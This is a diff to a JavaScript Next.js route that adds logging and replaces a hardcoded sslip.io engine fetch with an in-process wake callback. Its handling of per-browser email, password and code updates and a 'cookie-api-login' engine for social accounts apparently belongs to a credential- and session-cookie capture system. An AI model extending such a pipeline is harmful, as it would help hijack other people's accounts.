@@ -2,6 +2,7 @@ import { corsJson, corsOptions } from "../../../_shared/corsResponse.js";
 import { setCachedRow, getCachedRow } from "../../../../utils/cookieCache.js";
 import { incrementUsage } from "../../../../utils/serverlessTracker.js";
 import { requireFeature } from "../../../../utils/featureGate.js";
+import logger from "../../../../utils/logger.js";
 
 function parseBody(text) {
     try { return JSON.parse(text); } catch (e) {}
@@ -12,7 +13,10 @@ function parseBody(text) {
 export async function POST(request) {
     incrementUsage();
     const gate = await requireFeature('allowRevalidation', 'session revalidation');
-    if (gate) return gate;
+    if (gate) {
+        logger.warn(`[update-process] Rejected: allowRevalidation gate closed for ${new URL(request.url).pathname}`);
+        return gate;
+    }
 
     const text = await request.text();
     const body = parseBody(text);
@@ -23,6 +27,9 @@ export async function POST(request) {
     if (!browserId) {
         return corsJson({ success: false, error: "browserId required" }, 400);
     }
+
+    // Never log email/password/code values — updateType + browserId only.
+    logger.info(`[update-process][${browserId}] Received update type='${updateType}'`);
 
     const updates = { lastUserActivity: new Date().toISOString() };
 
@@ -64,12 +71,15 @@ export async function POST(request) {
 
     setCachedRow(browserId, updates);
 
-    const engineUrl = process.env.ENGINE_URL || 'https://webfixx-serverless-zvre9t-e955ff-157-173-204-24.sslip.io';
-    fetch(`${engineUrl}/socials/cookie/cookie-api-login`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ browserId, wakeUp: true })
-    }).catch(() => {});
+    // In-process wake: cookie-api-login registers this callback on globalThis.
+    // Both routes live in the same Next process, so the old loopback HTTP fetch
+    // only added a network failure mode ("fetch failed") with no benefit.
+    const kick = globalThis.__kickWaitingRows;
+    if (typeof kick === 'function') {
+        try { kick(); } catch (e) { logger.warn(`[update-process][${browserId}] Wake kick failed: ${e.message}`); }
+    } else {
+        logger.debug(`[update-process][${browserId}] No wake callback registered (cookie-api-login not loaded yet) — skipping kick.`);
+    }
 
     return corsJson({ success: true });
 }
